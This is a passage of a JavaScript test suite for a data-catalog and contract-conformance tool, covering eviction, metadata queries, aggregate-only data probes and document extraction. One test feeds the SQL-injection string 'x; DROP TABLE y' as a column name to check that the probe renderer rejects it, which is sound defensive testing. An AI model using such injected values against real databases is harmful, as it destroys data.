      const pack = env.cfm.buildContextPack({ purpose: 'chat', query: 'the customer master' });
      assert.ok(!pack.manifest.gaps.some((g) => g.needed === 'structure' && g.subject[0] === 'obj:edw/prod/edw.cust_mstr'));
    } finally { env.cleanup(); }
  });

  await test('v0.32.0: refresh on use — an unchanged last-altered only marks the object checked; a changed one is re-read and the ledger supersedes the schema fact', async () => {
    let altered = '2026-10-01T00:00:00Z';
    let columns = ['id INTEGER', 'amount NUMBER(18,2)'];
    let fetches = 0;
    const { parseDdl } = require('../dist/engine/context/fileIngestion.js');
    const live = () => {
      const g = parseDdl(`CREATE TABLE sales.orders (${columns.join(', ')});`, '/live', { system: 'shop', environment: 'prod' });
      for (const n of g.nodes) {
        n.origin = { ...n.origin, reliability: 'live-verified', lastVerifiedAt: new Date().toISOString() };
        if (n.type === 'table') n.metadata = { ...n.metadata, lastAltered: altered };
      }
      return g;
    };
    const fetcher = { covers: () => true, fetchStructure: async () => { fetches++; return live(); }, lastAltered: async (entries) => new Map(entries.map((e) => [e.id, altered])) };
    const env = await k2.cfm({ fetcher, policy: { schemaTtlDays: 0 } });
    try {
      const g = live();
      await env.cfm.ingestParsed(g.nodes, g.edges);
      const id = 'obj:shop/prod/sales.orders';
      assert.strictEqual(env.cfm.getCatalog().get(id).lastAltered, altered);
      await new Promise((r) => setTimeout(r, 5));
      let r = await env.cfm.refreshWorkingSet();
      assert.deepStrictEqual(r, { checked: 1, fetched: 0 }, 'unchanged: checked by last-altered, nothing re-read');
      assert.strictEqual(fetches, 0);
      altered = '2026-10-15T00:00:00Z';
      columns = ['id INTEGER', 'amount NUMBER(18,2)', 'channel VARCHAR(20)'];
      await new Promise((r) => setTimeout(r, 5));
      r = await env.cfm.refreshWorkingSet();
      assert.deepStrictEqual(r, { checked: 1, fetched: 1 });
      assert.ok(env.graph.getNodeById(`${id}.channel`), 'the new column is in the working set');
      assert.ok(env.cfm.getLedger().assertions().some((a) => a.predicate === 'node' && a.subject[0] === `${id}.channel` && a.status === 'active'));
    } finally { env.cleanup(); }
  });

  await test('v0.32.0: eviction — over the working-set size, unused and unreferenced tables leave it ("left the working set", no review flags); referenced ones and small estates stay', async () => {
    const { selectEvictions } = require('../dist/engine/context/catalog.js');
    const now = new Date('2026-10-15T00:00:00Z');
    const cat = { get: (id) => ({ lastUsedAt: id === 'b' ? '2026-10-14T00:00:00Z' : '2026-08-01T00:00:00Z' }) };
    const policy = { maxTables: 2, evictAfterDays: 30, schemaTtlDays: 7 };
    assert.deepStrictEqual(selectEvictions(['a', 'b', 'c', 'd'], cat, new Set(['c']), policy, now), ['a', 'd']);
    assert.deepStrictEqual(selectEvictions(['a', 'b'], cat, new Set(), policy, now), [], 'within the size nothing is evicted');

    const env = await k2.cfm({ policy: { maxTables: 3, evictAfterDays: 1 } });
    try {
      const g = k2.parsed('shop', 'shop', ['orders', 'customers', 'refunds']);
      await env.cfm.ingestParsed(g.nodes, g.edges);
      await env.cfm.getLedger().assert({ kind: 'key', subject: ['obj:shop/prod/shop.refunds'], predicate: 'primary', value: ['refunds_id'], statement: 'refunds_id is the key', evidence: [{ type: 'chat_message', ref: 't1' }], status: 'active', trust: 'confirmed' });
      const more = k2.parsed('crm', 'crm', ['tickets']);
      assert.deepStrictEqual(await env.cfm.ingestParsed(more.nodes, more.edges), { catalogued: 1, promoted: 0 }, 'over the size: catalogued only');
      await env.cfm.promote(['obj:crm/prod/crm.tickets']);
      assert.strictEqual(env.graph.getNodesByType('table').length, 4, 'a task used it: the working set is now over its size');
      // Nobody has used anything since January (markChecked also marks the entry for saving).
      for (const e of env.cfm.getCatalog().all()) { e.lastUsedAt = '2026-01-01T00:00:00Z'; env.cfm.getCatalog().markChecked(e.id, '2026-01-01T00:00:00Z'); }
      await env.cfm.getCatalog().save();
      const after = await env.reload();
      const tables = after.graph.getNodesByType('table').map((t) => t.id).sort();
      assert.deepStrictEqual(tables, ['obj:shop/prod/shop.customers', 'obj:shop/prod/shop.orders', 'obj:shop/prod/shop.refunds'], 'one evicted (oldest, then by id); the referenced table stays');
      const ledger = after.cfm.getLedger();
      const gone = ledger.assertions().find((a) => a.predicate === 'node' && a.subject[0] === 'obj:crm/prod/crm.tickets');
      assert.strictEqual(gone.status, 'rejected');
      assert.ok(ledger.history(gone.id).some((e) => e.reason === 'left the working set (unused; still in the catalog)'));
      assert.ok(!ledger.assertions().some((a) => a.status === 'needs_review'), 'eviction flags nothing for review');
      assert.strictEqual(after.cfm.getCatalog().get('obj:crm/prod/crm.tickets').tier, 1, 'a file-sourced entry keeps its structure in the catalog');
      const pack = after.cfm.buildContextPack({ purpose: 'chat', query: 'tickets' });
      assert.ok(pack.manifest.promoted && pack.manifest.promoted.includes('obj:crm/prod/crm.tickets'), 'and comes back on use');
      await after.cfm.whenIdle();
    } finally { env.cleanup(); }
  });

  await test('v0.32.0: profiling is sampled, one query per table, at most `concurrency` in flight and never over the query budget', async () => {
    const { SnowflakeAdapter } = require('../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const adapter = new SnowflakeAdapter({ account: 'acme', username: 'u', database: 'SALES' }, () => {});
    adapter.connectedDb = 'SALES';
    let inFlight = 0, maxInFlight = 0, profileQueries = 0;
    const names = Array.from({ length: 30 }, (_, i) => `T${i}`);
    adapter.executeQuery = async (sql) => {
      if (/INFORMATION_SCHEMA\.TABLES/i.test(sql)) return { columns: [], rows: names.map((n) => ({ TABLE_CATALOG: 'SALES', TABLE_SCHEMA: 'PUBLIC', TABLE_NAME: n, TABLE_TYPE: 'BASE TABLE' })), rowCount: 30, executionTimeMs: 0 };
      if (/INFORMATION_SCHEMA\.COLUMNS/i.test(sql)) return { columns: [], rows: names.flatMap((n) => [{ TABLE_SCHEMA: 'PUBLIC', TABLE_NAME: n, COLUMN_NAME: 'ID', DATA_TYPE: 'NUMBER', IS_NULLABLE: 'NO' }, { TABLE_SCHEMA: 'PUBLIC', TABLE_NAME: n, COLUMN_NAME: 'V', DATA_TYPE: 'TEXT', IS_NULLABLE: 'YES' }]), rowCount: 60, executionTimeMs: 0 };
      if (/SAMPLE \(/.test(sql)) {
        profileQueries++; inFlight++; maxInFlight = Math.max(maxInFlight, inFlight);
        await new Promise((r) => setTimeout(r, 2));
        inFlight--;
        return { columns: [], rows: [{ ROW_COUNT: 100, D_0: 100, N_0: 0, D_1: 7, N_1: 3 }], rowCount: 1, executionTimeMs: 0 };
      }
      assert.ok(!/COUNT\(DISTINCT/.test(sql), 'no per-column full scans');
      return { columns: [], rows: [], rowCount: 0, executionTimeMs: 0 };
    };
    adapter.getCapabilities = () => ({ supportsColumnProfiling: true, supportsLineageExtraction: false });
    const snap = await adapter.extractMetadata({ includeProfiling: true, profile: { queryBudget: 5, concurrency: 2, sampleRows: 500 } });
    assert.strictEqual(profileQueries, 5);
    assert.ok(maxInFlight <= 2);
    assert.deepStrictEqual(snap.profiling, { queries: 5, budget: 5, profiledTables: 5, skippedTables: 25 });
    assert.deepStrictEqual(snap.tables[0].columns.map((c) => c.profile), [{ distinctCount: 100, nullCount: 0 }, { distinctCount: 7, nullCount: 3 }]);
  });

  await test('v0.32.0: query-through SQL filters by table and reads last-altered; a table filter skips lineage; ConnectionManager exposes a catalog fetcher for its system', async () => {
    const { SnowflakeAdapter } = require('../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const { DatabricksAdapter } = require('../dist/engine/platform/adapters/DatabricksAdapter.js');
    const sf = new SnowflakeAdapter({ account: 'acme', username: 'u', database: 'SALES' }, () => {});
    sf.connectedDb = 'SALES';
    const q = sf.getMetadataQueries('SALES.PUBLIC', ["orders", "o'brien"]);
    assert.ok(/AND UPPER\(table_name\) IN \('ORDERS', 'O''BRIEN'\)/.test(q.listColumns) && /last_altered/.test(q.listTables) && /last_altered/.test(q.lastAltered));
    assert.ok(!/IN \(/.test(sf.getMetadataQueries('SALES.PUBLIC').listTables), 'no filter without tables');
    const db = new DatabricksAdapter({ workspaceUrl: 'https://x', token: 't', httpPath: '/sql/1.0/warehouses/abc', catalog: 'main' }, () => {});
    assert.ok(/lower\(table_name\) IN \('orders'\)/.test(db.getMetadataQueries('main.sales', ['ORDERS']).listTables));
    const seen = [];
    sf.executeQuery = async (sql) => { seen.push(sql); return { columns: [], rows: [], rowCount: 0, executionTimeMs: 0 }; };
    sf.getCapabilities = () => ({ supportsColumnProfiling: false, supportsLineageExtraction: true });
    await sf.extractMetadata({ schemaFilter: ['PUBLIC'], tableFilter: ['ORDERS'] });
    assert.ok(!seen.some((s) => /QUERY_HISTORY/i.test(s)), 'no lineage on query-through');
    const { ConnectionManager } = require('../dist/engine/platform/ConnectionManager.js');
    const cm = new ConnectionManager(() => {});
    assert.strictEqual(cm.catalogFetcher(), undefined, 'nothing connected');
    cm.activeAdapter = sf;
    cm.setEstateResolver(() => ({ identity: { system: 'shop', environment: 'prod', role: 'source' } }));
    const f = cm.catalogFetcher();
    assert.ok(f.covers('shop', 'prod') && !f.covers('crm', 'prod') && typeof f.lastAltered === 'function');
  });

  // ---------- v0.33.0: Phase C4a — business-problem pack, discover → validate → ask, conformance ----------

  const c4a = {
    REF: require('node:path').join(__dirname, 'reference', 'retail-orders'),
    read(rel) { return require('node:fs').readFileSync(require('node:path').join(c4a.REF, rel), 'utf8'); },
    catalog() {
      const { Catalog, entriesFromGraph } = require('../dist/engine/context/catalog.js');
      const { parseFile } = require('../dist/engine/context/fileIngestion.js');
      const cat = new Catalog('/unused');
      for (const [f, sys] of [['shop.ddl', 'shop'], ['crm.ddl', 'crm']]) {
        const r = parseFile(c4a.read(`sources/${f}`), f, { system: sys, environment: 'prod' });
        cat.upsert(entriesFromGraph(r.nodes, r.edges));
      }
      return cat;
    },
    profile() { return require('../dist/engine/context/profiles.js').parseProfile(c4a.read('documents/pack/profile.house-contract.yaml')).profile; },
    model(rel) { const pr = require('../dist/engine/context/profiles.js'); return pr.applyProfile(pr.parseStructured(c4a.read(rel)), c4a.profile()); },
    doc(over = {}) { return { id: 'customer-contract', path: 'docs/customer-contract.yaml', role: 'contract', authority: 'signed', version: '1', addedAt: '2026-10-15T00:00:00Z', ...over }; },
    async ledger() {
      const os = require('node:os'); const fs = require('node:fs'); const p = require('node:path');
      const dir = fs.mkdtempSync(p.join(os.tmpdir(), 'autode-c4a-'));
      const { AssertionLedger } = require('../dist/engine/context/ledger.js');
      const ledger = new AssertionLedger(dir);
      await ledger.load();
      return { ledger, cleanup: () => fs.rmSync(dir, { recursive: true, force: true }) };
    },
    samples() {
      const { parseSampleCsv, createSampleProbeExecutor } = require('../dist/engine/context/probes.js');
      return createSampleProbeExecutor(new Map([
        ['obj:shop/prod/shop.customers', parseSampleCsv(c4a.read('sources/samples/shop_customers.csv'))],
        ['obj:crm/prod/crm.customers', parseSampleCsv(c4a.read('sources/samples/crm_customers.csv'))]
      ]));
    }
  };

  await test('v0.33.0: the pack records documents by path with role, authority and version; clause refs pin the content hash', () => {
    const pk = require('../dist/engine/context/pack.js');
    let pack = pk.upsertDocument(pk.emptyPack(), { path: 'docs\\Customer Contract.yaml', role: 'contract', authority: 'signed', version: '1' });
    pack = pk.upsertDocument(pack, { path: 'docs/Customer Contract.yaml', role: 'contract', authority: 'signed', version: '2' });
    assert.strictEqual(pack.documents.length, 1, 'same path → same document');
    assert.strictEqual(pack.documents[0].id, 'customer-contract');
    assert.strictEqual(pack.documents[0].version, '2');
    const back = pk.parsePack(pk.serializePack(pack));
    assert.deepStrictEqual(back.documents.map((d) => [d.path, d.role, d.authority, d.version]), [['docs/Customer Contract.yaml', 'contract', 'signed', '2']]);
    assert.strictEqual(pk.clauseRef('c.yaml', 'a[0].b[1]', 'abcdef0123456789'), 'c.yaml#a[0].b[1]@abcdef012345');
    assert.strictEqual(pk.trustFor('signed'), 'confirmed');
    assert.strictEqual(pk.trustFor('draft'), 'documented');
    assert.deepStrictEqual(pk.parsePack('documents: [{ path: x.md, role: bogus }]').documents[0].role, 'other');
  });

  await test('v0.33.0: an interpretation profile reads a house-format contract deterministically; a proposal is validated and always starts "proposed"', () => {
    const pr = require('../dist/engine/context/profiles.js');
    const profile = c4a.profile();
    assert.ok(profile && profile.status === 'confirmed');
    const doc = pr.parseStructured(c4a.read('documents/pack/customer-contract.v1.yaml'));
    assert.ok(pr.profileMatches(doc, profile) && !pr.profileMatches({ other: 1 }, profile));
    const m = pr.applyProfile(doc, profile);
    assert.deepStrictEqual(m.warnings, []);
    const e = m.entities[0];
    assert.deepStrictEqual([e.name, e.tables], ['customer', ['shop.customers', 'crm.customers']]);
    assert.deepStrictEqual(e.fields.map((f) => [f.name, f.type, f.nullable, !!f.unique]), [['customer_ref', undefined, false, true], ['email', 'text(255)', false, false], ['phone', 'text(32)', true, false], ['country', 'text(2)', true, false], ['created', 'timestamp', true, false]]);
    assert.deepStrictEqual(e.fields[0].columns, { shop: 'customer_id', crm: 'cust_no' });
    assert.deepStrictEqual(e.rules, [{ field: 'email', check: 'not_null', path: 'data_objects[0].checks[0]' }]);
    assert.deepStrictEqual(pr.applyProfile(doc, profile), m, 'deterministic');
    const odd = pr.applyProfile({ contract_header: {}, data_objects: [{ object: 'x', checks: [{ on: 'a', rule: 'looks plausible' }] }] }, profile);
    assert.ok(odd.warnings.some((w) => /not mapped by the profile/.test(w)), 'an unmapped rule is reported, not guessed');
    const proposal = pr.parseProfileProposal({ ...profile, status: 'confirmed' });
    assert.strictEqual(proposal.profile.status, 'proposed', 'the LLM cannot confirm its own profile');
    assert.ok(pr.parseProfileProposal({ id: 'Bad Id', entities: {} }).errors.length > 0);
    assert.ok(JSON.stringify(pr.buildProfileProposalPrompt(doc, 'c.yaml').user).includes('data_objects'));
  });

  await test('v0.33.0: contract clauses are expectations with clause provenance; revision 2 supersedes exactly the changed clauses; a removed clause is retracted', async () => {
    const { reconcileContract, contractClauses } = require('../dist/engine/context/contracts.js');
    const { contentSha } = require('../dist/engine/context/pack.js');
    const env = await c4a.ledger();
    try {
      const v1 = c4a.read('documents/pack/customer-contract.v1.yaml');
      const clauses = contractClauses(c4a.doc(), c4a.model('documents/pack/customer-contract.v1.yaml'), contentSha(v1));
      assert.ok(clauses.every((c) => c.assertion.kind === 'quality_expectation' && c.assertion.trust === 'confirmed' && c.assertion.subject[0].startsWith('contract:customer-contract/customer.')));
      assert.ok(clauses.every((c) => /^docs\/customer-contract\.yaml#data_objects\[0\]\.(elements|checks)\[\d\]@[0-9a-f]{12}$/.test(c.assertion.evidence[0].ref)));
      assert.deepStrictEqual(await reconcileContract(env.ledger, c4a.doc(), c4a.model('documents/pack/customer-contract.v1.yaml'), contentSha(v1)), { asserted: 7, superseded: 0, retracted: 0, unchanged: 0 });
      assert.deepStrictEqual(await reconcileContract(env.ledger, c4a.doc(), c4a.model('documents/pack/customer-contract.v1.yaml'), contentSha(v1)), { asserted: 0, superseded: 0, retracted: 0, unchanged: 7 }, 're-applying the same version changes nothing');
      const v2 = c4a.read('documents/pack/customer-contract.v2.yaml');
      assert.deepStrictEqual(await reconcileContract(env.ledger, c4a.doc({ version: '2' }), c4a.model('documents/pack/customer-contract.v2.yaml'), contentSha(v2)), { asserted: 0, superseded: 3, retracted: 0, unchanged: 4 });
      const superseded = env.ledger.assertions().filter((a) => a.status === 'superseded').map((a) => a.subject[0]).sort();
      assert.deepStrictEqual(superseded, ['contract:customer-contract/customer.country', 'contract:customer-contract/customer.created', 'contract:customer-contract/customer.phone']);
      const m3 = c4a.model('documents/pack/customer-contract.v2.yaml');
      m3.entities[0].rules = [];
      const r3 = await reconcileContract(env.ledger, c4a.doc({ version: '3', authority: 'draft' }), m3, 'f'.repeat(64));
      assert.strictEqual(r3.retracted, 1, 'the dropped check is retracted');
      assert.strictEqual(r3.superseded, 6, 'a draft revision changes every remaining clause\'s trust (confirmed → documented)');
      const gone = env.ledger.assertions().find((a) => a.predicate === 'not_null' && a.status === 'rejected');
      assert.ok(/no longer in docs\/customer-contract\.yaml v3/.test(gone.reviewReason));
    } finally { env.cleanup(); }
  });

  await test('v0.33.0: conformance — every planted violation in source B, none in source A; without probes data clauses are "not verified", never passed', async () => {
    const { checkConformance, renderConformanceReport, typeFamily, physicalColumn } = require('../dist/engine/context/conformance.js');
    const cat = c4a.catalog();
    const model = c4a.model('documents/pack/customer-contract.v1.yaml');
    const r = await checkConformance(c4a.doc(), model, cat, c4a.samples());
    const fails = (fqn) => r.tables.find((t) => t.fqn === fqn).results.filter((x) => x.status === 'fail').map((x) => `${x.field}:${x.clause}`).sort();
    assert.deepStrictEqual(fails('crm.customers'), ['country:present', 'created:type', 'customer_ref:unique', 'email:nullability']);
    assert.deepStrictEqual(fails('shop.customers'), []);
    const dup = r.tables.find((t) => t.fqn === 'crm.customers').results.find((x) => x.clause === 'unique');
    assert.ok(!/C-20003/.test(dup.observed), 'counts only — no key values in the report');
    const md = renderConformanceReport(r);
    assert.ok(/\*\*FAIL\*\*/.test(md) && /docs\/customer-contract\.yaml#data_objects\[0\]\.elements\[3\]/.test(md));
    const offline = await checkConformance(c4a.doc(), model, cat, undefined);
    const uniq = offline.tables.flatMap((t) => t.results).filter((x) => x.clause === 'unique' || x.clause === 'not_null');
    assert.ok(uniq.length > 0 && uniq.every((x) => x.status === 'not_verified'));
    assert.deepStrictEqual(['VARCHAR(10)', 'text(2)', 'TIMESTAMP_NTZ', 'DATE', 'NUMBER(10,2)', 'BIGINT', 'VARIANT'].map(typeFamily), ['string', 'string', 'timestamp', 'date', 'number', 'integer', undefined]);
    const crm = cat.all().find((e) => e.id === 'obj:crm/prod/crm.customers');
    assert.strictEqual(physicalColumn(model.entities[0].fields[0], crm), 'cust_no');
    const bound = await checkConformance(c4a.doc({ bindings: { customer: ['obj:shop/prod/shop.customers'] } }), model, cat);
    assert.deepStrictEqual(bound.tables.map((t) => t.fqn), ['shop.customers'], 'an explicit pack binding wins');
  });

  await test('v0.33.0: probes are fixed aggregate-only templates per dialect, refuse non-identifiers, and agree between live SQL and sample rows', async () => {
    const pr = require('../dist/engine/context/probes.js');
    const spec = { check: 'unique', table: { fqn: 'CRM.PUBLIC.CUSTOMERS', id: 'obj:crm/prod/crm.customers' }, columns: ['CUST_NO'] };
    assert.strictEqual(pr.renderProbeSql(spec, 'snowflake', { sampleRows: 1000 }), 'SELECT COUNT(*) AS row_count, COUNT(DISTINCT CUST_NO) AS distinct_count, SUM(CASE WHEN CUST_NO IS NULL THEN 1 ELSE 0 END) AS null_count FROM CRM.PUBLIC.CUSTOMERS SAMPLE (1000 ROWS)');
    assert.ok(/TABLESAMPLE \(10 ROWS\)/.test(pr.renderProbeSql(spec, 'spark_sql', { sampleRows: 10 })));
    assert.ok(/NOT IN \('A', 'O''B'\)/.test(pr.renderProbeSql({ ...spec, check: 'accepted_values', values: ['A', "O'B"] }, 'ansi')));
    assert.ok(/LEFT JOIN \(SELECT DISTINCT ID FROM SHOP\.C\) t ON f\.SHOP_ID = t\.ID/.test(pr.renderProbeSql({ check: 'orphans', table: { fqn: 'CRM.C' }, columns: ['SHOP_ID'], to: { fqn: 'SHOP.C', columns: ['ID'] } }, 'snowflake')));
    assert.throws(() => pr.renderProbeSql({ ...spec, columns: ['x; DROP TABLE y'] }, 'snowflake'), /not a plain identifier/);
    for (const check of ['unique', 'not_null', 'accepted_values', 'orphans', 'freshness']) {
      const sql = pr.renderProbeSql({ check, table: { fqn: 'T' }, columns: ['C'], values: ['A'], to: { fqn: 'U', columns: ['D'] } }, 'snowflake');
      assert.ok(/^SELECT COUNT\(\*\) AS row_count/.test(sql) && !/SELECT \*(?! FROM)/.test(sql.replace('COUNT(*)', '')), `${check} returns aggregates only`);
    }
    // The same aggregates from live SQL and from the sample agree.
    const rows = pr.parseSampleCsv(c4a.read('sources/samples/crm_customers.csv'));
    const sample = await pr.createSampleProbeExecutor(new Map([[spec.table.id, rows]])).run({ ...spec, columns: ['cust_no'] });
    const live = await pr.createSqlProbeExecutor(async () => [{ ROW_COUNT: 4, DISTINCT_COUNT: 3, NULL_COUNT: 0 }], 'snowflake').run(spec);
    assert.deepStrictEqual([sample.pass, sample.observed.duplicates, sample.source], [false, 1, 'sample']);
    assert.deepStrictEqual([live.pass, live.observed.duplicates, live.source], [false, 1, 'live']);
    const values = new Set(rows.flatMap((r) => Object.values(r)).filter((v) => v.length > 3));
    assert.ok(![...values].some((v) => JSON.stringify(sample).includes(v)), 'no sample value leaves the probe');
    // combined: live where it reaches the table, else the sample
    const combined = pr.combineProbeExecutors([{ kind: 'live', covers: () => false, run: async () => { throw new Error('not here'); } }, pr.createSampleProbeExecutor(new Map([[spec.table.id, rows]]))]);
    assert.strictEqual((await combined.run({ ...spec, columns: ['cust_no'] })).source, 'sample');
    assert.strictEqual(await combined.run({ ...spec, table: { fqn: 'X', id: 'obj:x/y/z' } }), undefined);
  });

  await test('v0.33.0: verifying claims records verified (trust → verified) or verification_failed (→ needs_review, numbers as the reason); contract subjects are not probed', async () => {
    const pr = require('../dist/engine/context/probes.js');
    const env = await c4a.ledger();
    try {
      const ev = [{ type: 'chat_message', ref: 't7' }];
      const bad = await env.ledger.assert({ kind: 'key', subject: ['obj:crm/prod/crm.customers'], predicate: 'unique', value: ['cust_no'], statement: 'cust_no is unique', evidence: ev, trust: 'inferred', status: 'proposed' });
      const good = await env.ledger.assert({ kind: 'key', subject: ['obj:shop/prod/shop.customers'], predicate: 'unique', value: ['customer_id'], statement: 'customer_id is unique', evidence: ev, trust: 'inferred', status: 'proposed' });
      const nn = await env.ledger.assert({ kind: 'quality_expectation', subject: ['obj:shop/prod/shop.customers.email'], predicate: 'not_null', value: { check: 'not_null' }, statement: 'email is never blank', evidence: ev, trust: 'documented', status: 'active' });
      const resolve = (id) => !id.startsWith('obj:') ? undefined : id.endsWith('.email') ? { table: { fqn: 'shop.customers', id: 'obj:shop/prod/shop.customers' }, column: 'email' } : id.startsWith('obj:') ? { table: { fqn: id.split('/').pop(), id } } : undefined;
      const out = await pr.verifyAssertions(env.ledger, [bad, good, nn], c4a.samples(), resolve);
      assert.deepStrictEqual(out.map((o) => o.result && o.result.pass), [false, true, true]);
      const after = (a) => env.ledger.get(a.id);
      assert.deepStrictEqual([after(bad).status, after(bad).verification.result], ['needs_review', 'fail']);
      assert.ok(/not unique: 1 duplicate/.test(after(bad).reviewReason) && /\(sample data\)$/.test(after(bad).reviewReason));
      assert.deepStrictEqual([after(good).trust, after(good).status], ['verified', 'proposed'], 'verified evidence, still the engineer\'s call to confirm');
      assert.strictEqual(after(nn).trust, 'verified');
      assert.deepStrictEqual(pr.probesFor({ kind: 'quality_expectation', subject: ['contract:x/customer.email'], value: { check: 'not_null' } }, resolve), []);
    } finally { env.cleanup(); }
  });

  await test('v0.33.0: free-text extraction proposes facts with section-level provenance; bad facts are dropped, unresolved subjects flagged, re-extraction adds nothing', async () => {
    const dx = require('../dist/engine/context/documentExtraction.js');
    const brd = c4a.read('documents/pack/brd.md');
    const sections = dx.splitSections(brd);
    assert.deepStrictEqual(sections.map((s) => s.path), ['retail-analytics-business-requirements-draft:L1-L1', '1-purpose:L3-L4', '2-definitions:L6-L8', '3-data-rules:L10-L12', '4-constraints:L14-L15']);
    assert.ok(dx.buildDocumentExtractionPrompt({ path: 'brd.md', role: 'brd' }, sections).user.includes('[2-definitions:L6-L8]'));
    const raw = { facts: [
      { section: '2-definitions:L6-L8', kind: 'metric', subject: ['net revenue'], predicate: 'defined_as', value: { name: 'net revenue', definition: 'gross minus discounts and refunds, excluding cancelled orders' }, statement: 'Net revenue is gross order line value minus discounts and refunds, excluding cancelled orders.', quote: 'Net revenue is gross order line value minus discounts and refunds, excluding cancelled orders.' },
      { section: '3-data-rules:L10-L12', kind: 'quality_expectation', subject: ['shop.orders.status'], predicate: 'accepted_values', value: { check: 'accepted_values', values: ['PLACED', 'SHIPPED', 'CANCELLED', 'RETURNED'] }, statement: 'Order status is one of PLACED, SHIPPED, CANCELLED or RETURNED.', quote: 'Order status is one of PLACED, SHIPPED, CANCELLED or RETURNED' },
      { section: '9-nowhere', kind: 'decision', subject: ['x'], value: {}, statement: 'invented' },
      { section: '1-purpose:L3-L4', kind: 'key', subject: ['shop.orders'], predicate: 'unique', value: 'not a list', statement: 'bad value' }
    ] };
    const resolve = (r) => (r === 'shop.orders.status' ? 'obj:shop/prod/shop.orders.status' : undefined);
    const out = dx.parseDocumentExtraction(raw, { id: 'brd', path: 'docs/brd.md' }, sections, 'a'.repeat(64), resolve);
    assert.strictEqual(out.proposed.length, 2);
    assert.strictEqual(out.dropped.length, 2);
    assert.ok(out.proposed.every((p) => p.status === 'proposed' && p.trust === 'inferred' && /^docs\/brd\.md#[a-z0-9-]+:L\d+-L\d+@a{12}$/.test(p.evidence[0].ref)));
    assert.deepStrictEqual(out.proposed[0].flags, ['unresolved_subject']);
    assert.deepStrictEqual(out.proposed[1].subject, ['obj:shop/prod/shop.orders.status']);
    const env = await c4a.ledger();
    try {
      assert.strictEqual(await dx.recordExtraction(env.ledger, out), 2);
      assert.strictEqual(await dx.recordExtraction(env.ledger, out), 0, 'equal proposals are not recorded twice');
    } finally { env.cleanup(); }
  });

  await test('v0.33.0: discover → validate → ask — questions discovery answers are dropped with the reason; the rest are asked', () => {
    const dg = require('../dist/engine/context/discoveryGaps.js');
    const { parseDdl } = require('../dist/engine/context/fileIngestion.js');
    const g = parseDdl(c4a.read('sources/shop.ddl'), '/shop.ddl', { system: 'shop', environment: 'prod' });
    const graph = { nodes: g.nodes, edges: g.edges };
    const grain = { id: 'G1', kind: 'grain', subject: ['obj:shop/prod/shop.order_items'], predicate: 'grain', value: ['order_item_id'], status: 'active', trust: 'confirmed', evidence: [], statement: '', validFrom: '', createdBy: 'u', createdAt: '' };
    const qs = ['What is the primary key of shop.customers?', 'What is the grain of shop.order_items?', 'What is the grain of shop.orders?', 'How should refunds after the reporting day be treated?', 'What is the key of dim_customer?'].map((prompt) => ({ prompt }));
    const r = dg.filterInterviewQuestions(qs, graph, [grain]);
    assert.deepStrictEqual(r.answered.map((a) => a.question.prompt), ['What is the primary key of shop.customers?', 'What is the grain of shop.order_items?']);
    assert.ok(/declared in its schema/.test(r.answered[0].reason) && /confirmed/.test(r.answered[1].reason));
    assert.strictEqual(r.ask.length, 3);
    const block = dg.knownFactsBlock(dg.knownFacts(graph, [grain]));
    assert.ok(/do not ask/.test(block) && /the key of shop\.customers is \(customer_id\)/.test(block));
  });

  await test('v0.33.0: vocabulary capture — abbreviations mined from names and comments without an LLM; LLM proposals filtered; accepted entries merged into vocabulary.yaml', () => {
    const v = require('../dist/engine/context/vocabulary.js');
    const vocab = v.buildVocabulary();
    const mined = v.mineAbbreviations([
      { name: 'PTRN_NO', comment: 'Patron number' }, { name: 'PTRN_TIER', comment: 'Patron loyalty tier' },
      { name: 'ENGMT_ID', comment: 'Engagement identifier' }, { name: 'CUST_NO', comment: 'Customer number' }, { name: 'X_Y', comment: 'nothing to see' }
    ], vocab);
    assert.deepStrictEqual(mined.map((p) => [p.from, p.to, p.support]), [['ptrn', 'patron', 2], ['engmt', 'engagement', 1]], 'CUST is already known; unsupported tokens are not guessed');
    const llm = v.parseVocabularyProposal({ abbreviations: { CUST: 'customer', PTRN: 'patron', 'bad key!': 'x' }, synonyms: [['campaign', 'engagement'], ['customer', 'client']] }, vocab);
    assert.deepStrictEqual(llm.map((p) => `${p.kind}:${p.from}->${p.to}`), ['abbreviation:ptrn->patron', 'synonym:engagement->campaign'], 'known entries are skipped');
    const phrases = v.parseVocabularyProposal({ synonyms: [['refund', 'money back'], ['ticket', 'complaint', 'service request']] }, vocab);
    assert.deepStrictEqual(phrases.map((p) => `${p.from}->${p.to}`), ['complaint->ticket'], 'multi-word synonyms are dropped: retrieval matches single words, so they could never apply');
    const text = v.mergeVocabularyFile('synonyms:\n  - [customer, patron]\n', [...mined, ...llm]);
    const merged = v.buildVocabulary(v.parseVocabularyFile(text));
    assert.deepStrictEqual(v.concepts('PTRN_NO ENGMT engagement', merged), ['customer', 'number', 'campaign', 'campaign']);
  });

  await test('v0.33.0: BusinessPackManager — a contract with no confirmed profile gets one proposed for review (not applied); once confirmed it is applied; samples feed probes', async () => {
    const os = require('node:os'); const fs = require('node:fs'); const p = require('node:path');
    const env = await k2.cfm();
    try {
      const big = require('../dist/engine/context/fileIngestion.js').parseFile(c4a.read('sources/crm.ddl'), 'crm.ddl', { system: 'crm', environment: 'prod' });
      await env.cfm.ingestParsed(big.nodes, big.edges);
      fs.mkdirSync(p.join(env.dir, 'docs'), { recursive: true });
      fs.writeFileSync(p.join(env.dir, 'docs', 'contract.yaml'), c4a.read('documents/pack/customer-contract.v1.yaml'));
      fs.writeFileSync(p.join(env.dir, 'docs', 'crm.csv'), c4a.read('sources/samples/crm_customers.csv'));
      const asked = [];
      const complete = async (system, user, purpose) => { asked.push(purpose); return { ...c4a.profile(), id: 'house-contract' }; };
      const { BusinessPackManager } = require('../dist/context/BusinessPackManager.js');
      const pm = new BusinessPackManager(p.join(env.dir, '.autode', 'problems', 'x', 'pack'), env.dir, () => env.cfm, () => {}, complete);
      await pm.load();
      const doc = await pm.addDocument({ path: p.join(env.dir, 'docs', 'contract.yaml'), role: 'contract', authority: 'signed', version: '1' });
      assert.strictEqual(doc.path, 'docs/contract.yaml', 'stored workspace-relative');
      const first = await pm.applyDocument(doc.id);
      assert.strictEqual(first.status, 'profile_proposed');
      assert.ok(/status: proposed/.test(fs.readFileSync(first.profilePath, 'utf8')));
      assert.strictEqual((await pm.applyDocument(doc.id)).status, 'needs_profile', 'a proposed profile is not applied until confirmed');
      assert.strictEqual(asked.length, 1);
      fs.writeFileSync(first.profilePath, fs.readFileSync(first.profilePath, 'utf8').replace('status: proposed', 'status: confirmed'));
      await pm.load();
